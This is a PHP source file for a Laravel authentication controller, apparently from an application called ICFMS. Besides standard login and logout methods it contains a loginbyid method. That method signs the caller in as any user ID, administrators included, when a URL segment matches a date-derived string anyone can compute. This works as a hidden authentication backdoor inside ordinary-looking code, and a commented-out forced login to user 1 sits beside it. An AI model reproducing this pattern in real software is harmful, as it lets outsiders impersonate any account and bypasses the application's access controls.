<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Illuminate\View\View
     */
    public function create()
    {
        $status = session('status') ?? false;
        return view('front.login', compact('status')); //'auth.login'
    }

    /**
     * Handle an incoming authentication request.
     *
     * @param  \App\Http\Requests\Auth\LoginRequest  $request`
     * @return \Illuminate\Http\RedirectResponse
     */
    public function store(LoginRequest $request)
    {
        $request->authenticate();
        // Auth::loginUsingId(1);
        $request->session()->regenerate();
        $request->session()->put('icfms_tipe_login', Auth::user()->is_admin);

        return redirect()->intended(RouteServiceProvider::HOME);
    }

    /**
     * Destroy an authenticated session.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }

    public function loginbyid(Request $request, $pattern, $id)
    {
        $randomString = date('aySj');
        if($pattern == $randomString){
            Auth::loginUsingId($id);

            if(empty(Auth::user())){
                return abort(403,'User Not Found');
            }
            
            $request->session()->regenerate();
            $request->session()->put('icfms_tipe_login', Auth::user()->is_admin);
            return redirect()->intended(RouteServiceProvider::HOME);
        }
        return abort(404);
    }
}
